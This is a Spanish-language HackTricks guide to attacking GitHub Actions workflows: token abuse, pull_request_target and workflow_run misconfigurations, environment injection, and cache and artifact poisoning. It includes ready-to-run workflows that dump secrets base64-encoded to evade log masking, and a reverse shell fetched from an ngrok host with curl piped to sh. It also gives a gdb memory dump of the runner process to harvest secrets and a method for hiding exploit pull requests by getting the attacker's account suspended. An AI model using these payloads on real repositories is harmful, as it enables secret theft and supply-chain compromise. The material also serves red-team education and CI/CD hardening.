# Abusando de Github Actions

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informaci√≥n B√°sica

En esta p√°gina encontrar√°s:

* Un **resumen de todos los impactos** de un atacante que logra acceder a una Github Action
* Diferentes formas de **obtener acceso a una acci√≥n**:
* Tener **permisos** para crear la acci√≥n
* Abusar de los disparadores relacionados con **pull request**
* Abusar de **otras t√©cnicas de acceso externo**
* **Pivotar** desde un repositorio ya comprometido
* Finalmente, una secci√≥n sobre **t√©cnicas de post-explotaci√≥n para abusar de una acci√≥n desde dentro** (causar los impactos mencionados)

## Resumen de Impactos

Para una introducci√≥n sobre [**Github Actions revisa la informaci√≥n b√°sica**](../basic-github-information.md#github-actions).

En caso de que puedas **ejecutar acciones arbitrarias de Github/inyectar c√≥digo** en un **repositorio**, podr√≠as ser capaz de:

* **Robar** los **secretos** de ese repo/organizaci√≥n.
* Si solo puedes inyectar, puedes robar lo que ya est√© presente en el workflow.
* Abusar de los **privilegios del repo** para acceder a otras plataformas como AWS y GCP.
* **Ejecutar c√≥digo en trabajadores personalizados** (si se usan trabajadores personalizados) e intentar pivotar desde all√≠.
* **Sobrescribir** el **c√≥digo** del repositorio.
* Esto depende de los privilegios del `GITHUB_TOKEN` (si los hay).
* **Comprometer** **despliegues** y otros **artefactos**.
* Si el c√≥digo est√° desplegando o almacenando algo, podr√≠as modificar eso y obtener m√°s acceso.

## GITHUB\_TOKEN

Este "**secreto**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se da cuando el administrador habilita esta opci√≥n:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que usar√° una **Aplicaci√≥n de Github**, por lo que puede acceder a los mismos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github deber√≠a lanzar un [**flujo**](https://github.com/github/roadmap/issues/74) que **permita el acceso entre repositorios** dentro de GitHub, para que un repo pueda acceder a otros repos internos usando el `GITHUB_TOKEN`.
{% endhint %}

Puedes ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Ten en cuenta que el token **expira despu√©s de que el trabajo se haya completado**.\
Estos tokens se ven as√≠: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puedes hacer con este token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Aprobar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Ten en cuenta que en varias ocasiones podr√°s encontrar **tokens de usuario de github dentro de los entornos de Github Actions o en los secretos**. Estos tokens pueden darte m√°s privilegios sobre el repositorio y la organizaci√≥n.
{% endhint %}

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener shell inversa con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es posible verificar los permisos otorgados a un Github Token en los repositorios de otros usuarios **revisando los logs** de las acciones:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ejecuci√≥n Permitida

{% hint style="info" %}
Esta ser√≠a la forma m√°s f√°cil de comprometer las acciones de Github, ya que este caso supone que tienes acceso para **crear un nuevo repositorio en la organizaci√≥n**, o tienes **privilegios de escritura sobre un repositorio**.

Si est√°s en este escenario, puedes simplemente revisar las [t√©cnicas de Post Explotaci√≥n](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Ejecuci√≥n desde la Creaci√≥n de Repositorio

En caso de que los miembros de una organizaci√≥n puedan **crear nuevos repositorios** y puedas ejecutar acciones de github, puedes **crear un nuevo repositorio y robar los secretos establecidos a nivel de organizaci√≥n**.

### Ejecuci√≥n desde una Nueva Rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Github Action** configurada, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa acci√≥n desde la nueva rama**. De esta manera puedes **exfiltrar secretos a nivel de repositorio y organizaci√≥n** (pero necesitas saber c√≥mo se llaman).

Puedes hacer que la acci√≥n modificada sea ejecutable **manualmente**, cuando se **crea un PR** o cuando **se sube alg√∫n c√≥digo** (dependiendo de qu√© tan ruidoso quieras ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ejecuci√≥n Bifurcada

{% hint style="info" %}
Hay diferentes desencadenantes que podr√≠an permitir a un atacante **ejecutar una Github Action de otro repositorio**. Si esas acciones desencadenables est√°n mal configuradas, un atacante podr√≠a comprometerlas.
{% endhint %}

### `pull_request`

El desencadenante del flujo de trabajo **`pull_request`** ejecutar√° el flujo de trabajo cada vez que se reciba una solicitud de extracci√≥n con algunas excepciones: por defecto, si es la **primera vez** que est√°s **colaborando**, alg√∫n **mantenedor** necesitar√° **aprobar** la **ejecuci√≥n** del flujo de trabajo:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como la **limitaci√≥n por defecto** es para colaboradores de **primera vez**, podr√≠as contribuir **arreglando un error/typo v√°lido** y luego enviar **otras PRs para abusar de tus nuevos privilegios de `pull_request`**.

**Prob√© esto y no funciona**: ~~Otra opci√≥n ser√≠a crear una cuenta con el nombre de alguien que contribuy√≥ al proyecto y elimin√≥ su cuenta.~~
{% endhint %}

Adem√°s, por defecto **previene permisos de escritura** y **acceso a secretos** al repositorio objetivo como se menciona en la [**documentaci√≥n**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Con la excepci√≥n de `GITHUB_TOKEN`, **los secretos no se pasan al runner** cuando un flujo de trabajo se desencadena desde un repositorio **bifurcado**. El **`GITHUB_TOKEN` tiene permisos de solo lectura** en solicitudes de extracci√≥n **desde repositorios bifurcados**.

Un atacante podr√≠a modificar la definici√≥n de la Github Action para ejecutar cosas arbitrarias y agregar acciones arbitrarias. Sin embargo, no podr√° robar secretos ni sobrescribir el repositorio debido a las limitaciones mencionadas.

{% hint style="danger" %}
**S√≠, si el atacante cambia en la PR la github action que se desencadenar√°, su Github Action ser√° la utilizada y no la del repositorio original!**
{% endhint %}

Como el atacante tambi√©n controla el c√≥digo que se ejecuta, incluso si no hay secretos o permisos de escritura en el `GITHUB_TOKEN`, un atacante podr√≠a, por ejemplo, **subir artefactos maliciosos**.

### **`pull_request_target`**

El desencadenante del flujo de trabajo **`pull_request_target`** tiene **permiso de escritura** en el repositorio objetivo y **acceso a secretos** (y no pide permiso).

Ten en cuenta que el desencadenante del flujo de trabajo **`pull_request_target`** **se ejecuta en el contexto base** y no en el dado por la PR (para **no ejecutar c√≥digo no confiable**). Para m√°s informaci√≥n sobre `pull_request_target` [**consulta la documentaci√≥n**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Adem√°s, para m√°s informaci√≥n sobre este uso espec√≠fico y peligroso, consulta este [**blog de github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Podr√≠a parecer que porque el **flujo de trabajo ejecutado** es el definido en la **base** y **no en la PR** es **seguro** usar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

Y este tendr√° **acceso a secretos**.

### `workflow_run`

El desencadenante [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite ejecutar un flujo de trabajo desde otro diferente cuando est√° `completed`, `requested` o `in_progress`.

En este ejemplo, un flujo de trabajo est√° configurado para ejecutarse despu√©s de que el flujo de trabajo separado "Run Tests" se complete:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Adem√°s, seg√∫n la documentaci√≥n: El flujo de trabajo iniciado por el evento `workflow_run` puede **acceder a secretos y escribir tokens, incluso si el flujo de trabajo anterior no pod√≠a**.

Este tipo de flujo de trabajo podr√≠a ser atacado si **depende** de un **flujo de trabajo** que puede ser **activado** por un usuario externo a trav√©s de **`pull_request`** o **`pull_request_target`**. Un par de ejemplos vulnerables pueden ser [**encontrados en este blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** El primero consiste en que el flujo de trabajo activado por **`workflow_run`** descarga el c√≥digo del atacante: `${{ github.event.pull_request.head.sha }}`\
El segundo consiste en **pasar** un **artefacto** del c√≥digo **no confiable** al flujo de trabajo **`workflow_run`** y usar el contenido de este artefacto de una manera que lo hace **vulnerable a RCE**.

### `workflow_call`

TODO

TODO: Verificar si cuando se ejecuta desde un pull\_request el c√≥digo usado/descargado es el del origen o del PR bifurcado

## Abusando de la Ejecuci√≥n Bifurcada

Hemos mencionado todas las formas en que un atacante externo podr√≠a lograr que un flujo de trabajo de github se ejecute, ahora veamos c√≥mo estas ejecuciones, si est√°n mal configuradas, podr√≠an ser abusadas:

### Ejecuci√≥n de checkout no confiable

En el caso de **`pull_request`,** el flujo de trabajo se ejecutar√° en el **contexto del PR** (por lo que ejecutar√° el **c√≥digo malicioso del PR**), pero alguien necesita **autorizarlo primero** y se ejecutar√° con algunas [limitaciones](./#pull\_request).

En caso de un flujo de trabajo que use **`pull_request_target` o `workflow_run`** que dependa de un flujo de trabajo que puede ser activado desde **`pull_request_target` o `pull_request`** se ejecutar√° el c√≥digo del repositorio original, por lo que el **atacante no puede controlar el c√≥digo ejecutado**.

{% hint style="danger" %}
Sin embargo, si la **acci√≥n** tiene un **checkout expl√≠cito del PR** que **obtendr√° el c√≥digo del PR** (y no de la base), usar√° el c√≥digo controlado por el atacante. Por ejemplo (ver l√≠nea 12 donde se descarga el c√≥digo del PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSEGURO. Proporcionado solo como ejemplo.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

El c√≥digo potencialmente **no confiable se est√° ejecutando durante `npm install` o `npm build`** ya que los scripts de construcci√≥n y los **paquetes referenciados est√°n controlados por el autor del PR**.

{% hint style="warning" %}
Un github dork para buscar acciones vulnerables es: `event.pull_request pull_request_target extension:yml` sin embargo, hay diferentes formas de configurar los trabajos para que se ejecuten de manera segura incluso si la acci√≥n est√° configurada de manera insegura (como usar condicionales sobre qui√©n es el actor que genera el PR).
{% endhint %}

### Inyecciones de Script en el Contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Tenga en cuenta que hay ciertos [**contextos de github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores son **controlados** por el **usuario** que crea el PR. Si la acci√≥n de github est√° usando esos **datos para ejecutar algo**, podr√≠a llevar a **ejecuci√≥n arbitraria de c√≥digo:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Inyecci√≥n de Script en GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

De la documentaci√≥n: Puedes hacer que una **variable de entorno est√© disponible para cualquier paso subsecuente** en un trabajo de flujo de trabajo definiendo o actualizando la variable de entorno y escribi√©ndola en el archivo de entorno **`GITHUB_ENV`**.

Si un atacante pudiera **inyectar cualquier valor** dentro de esta **variable de entorno**, podr√≠a inyectar variables de entorno que podr√≠an ejecutar c√≥digo en pasos siguientes como **LD\_PRELOAD** o **NODE\_OPTIONS**.

Por ejemplo ([**este**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) y [**este**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagina un flujo de trabajo que conf√≠a en un artefacto subido para almacenar su contenido dentro de la variable de entorno **`GITHUB_ENV`**. Un atacante podr√≠a subir algo como esto para comprometerlo:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Acciones de Github de Terceros Vulnerables

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como se menciona en [**esta publicaci√≥n de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta Acci√≥n de Github permite acceder a artefactos de diferentes flujos de trabajo e incluso repositorios.

El problema es que si el par√°metro **`path`** no est√° configurado, el artefacto se extrae en el directorio actual y puede sobrescribir archivos que podr√≠an ser utilizados o incluso ejecutados m√°s tarde en el flujo de trabajo. Por lo tanto, si el Artefacto es vulnerable, un atacante podr√≠a abusar de esto para comprometer otros flujos de trabajo que conf√≠an en el Artefacto.

Ejemplo de flujo de trabajo vulnerable:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Esto podr√≠a ser atacado con este flujo de trabajo:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Otro Acceso Externo

### Secuestro de Repositorio de Namespace Eliminado

Si una cuenta cambia su nombre, otro usuario podr√≠a registrar una cuenta con ese nombre despu√©s de un tiempo. Si un repositorio ten√≠a **menos de 100 estrellas antes del cambio de nombre**, Github permitir√° al nuevo usuario registrado con el mismo nombre crear un **repositorio con el mismo nombre** que el eliminado.

{% hint style="danger" %}
Entonces, si una acci√≥n est√° usando un repositorio de una cuenta inexistente, a√∫n es posible que un atacante pueda crear esa cuenta y comprometer la acci√≥n.
{% endhint %}

Si otros repositorios estaban usando **dependencias de los repositorios de este usuario**, un atacante podr√° secuestrarlos. Aqu√≠ tienes una explicaci√≥n m√°s completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
En esta secci√≥n hablaremos sobre t√©cnicas que permitir√≠an **pivotar de un repositorio a otro** suponiendo que tenemos alg√∫n tipo de acceso en el primero (revisa la secci√≥n anterior).
{% endhint %}

### Envenenamiento de Cach√©

Se mantiene una cach√© entre **ejecuciones de workflow en la misma rama**. Lo que significa que si un atacante **compromete** un **paquete** que luego se almacena en la cach√© y es **descargado** y ejecutado por un workflow **m√°s privilegiado**, tambi√©n podr√° **comprometer** ese workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamiento de Artefactos

Los workflows podr√≠an usar **artefactos de otros workflows e incluso repositorios**, si un atacante logra **comprometer** la Github Action que **sube un artefacto** que luego es usado por otro workflow, podr√≠a **comprometer los otros workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Explotaci√≥n desde una Acci√≥n

### Accediendo a AWS y GCP v√≠a OIDC

Revisa las siguientes p√°ginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accediendo a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si est√°s inyectando contenido en un script, es interesante saber c√≥mo puedes acceder a secretos:

* Si el secreto o token est√° configurado como una **variable de entorno**, se puede acceder directamente a trav√©s del entorno usando **`printenv`**.

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener shell inversa con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Si el secreto se usa **directamente en una expresi√≥n**, el script de shell generado se almacena **en disco** y es accesible.
* ```bash
cat /home/runner/work/_temp/*
```
* Para una acci√≥n de JavaScript, los secretos se env√≠an a trav√©s de variables de entorno
* ```bash
ps axe | grep node
```
* Para una **acci√≥n personalizada**, el riesgo puede variar dependiendo de c√≥mo un programa est√© usando el secreto que obtuvo del **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de runners autohospedados

La forma de encontrar qu√© **Github Actions se est√°n ejecutando en infraestructura no-Github** es buscar **`runs-on: self-hosted`** en la configuraci√≥n yaml de Github Action.

Los runners **autohospedados** podr√≠an tener acceso a **informaci√≥n extra sensible**, a otros **sistemas de red** (¬øendpoints vulnerables en la red? ¬øservicio de metadatos?) o, incluso si est√° aislado y destruido, **m√°s de una acci√≥n podr√≠a ejecutarse al mismo tiempo** y la maliciosa podr√≠a **robar los secretos** de la otra.

En los runners autohospedados tambi√©n es posible obtener los **secretos del proceso \_Runner.Listener\_** que contendr√° todos los secretos de los flujos de trabajo en cualquier paso al volcar su memoria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consulta [**esta publicaci√≥n para m√°s informaci√≥n**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de Im√°genes Docker de Github

Es posible crear acciones de Github que **construyan y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente desplegable:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como pudiste ver en el c√≥digo anterior, el registro de Github est√° alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repositorio podr√° entonces descargar la Imagen Docker usando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Luego, el usuario podr√≠a buscar **secretos filtrados en las capas de la imagen de Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informaci√≥n sensible en los registros de Github Actions

Incluso si **Github** intenta **detectar valores secretos** en los registros de las acciones y **evitar mostrarlos**, **otros datos sensibles** que podr√≠an haberse generado en la ejecuci√≥n de la acci√≥n no ser√°n ocultados. Por ejemplo, un JWT firmado con un valor secreto no ser√° ocultado a menos que est√© [espec√≠ficamente configurado](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cubriendo tus huellas

(T√©cnica de [**aqu√≠**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primero que todo, cualquier PR levantado es claramente visible para el p√∫blico en Github y para la cuenta de GitHub objetivo. En GitHub por defecto, **no podemos eliminar un PR de internet**, pero hay un giro. Para las cuentas de Github que son **suspendidas** por Github, todos sus **PRs son autom√°ticamente eliminados** y removidos de internet. As√≠ que para ocultar tu actividad necesitas que tu **cuenta de GitHub sea suspendida o que tu cuenta sea marcada**. Esto **ocultar√≠a todas tus actividades** en GitHub de internet (b√°sicamente eliminar√≠a todos tus PR de explotaci√≥n).

Una organizaci√≥n en GitHub es muy proactiva en reportar cuentas a GitHub. Todo lo que necesitas hacer es compartir ‚Äúalguna cosa‚Äù en Issue y se asegurar√°n de que tu cuenta sea suspendida en 12 horas :p y ah√≠ lo tienes, tu explotaci√≥n invisible en github.

{% hint style="warning" %}
La √∫nica manera para que una organizaci√≥n se d√© cuenta de que ha sido objetivo es revisar los registros de GitHub desde SIEM ya que desde la UI de GitHub el PR ser√≠a eliminado.
{% endhint %}

## Herramientas

Las siguientes herramientas son √∫tiles para encontrar flujos de trabajo de Github Action e incluso encontrar los vulnerables:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
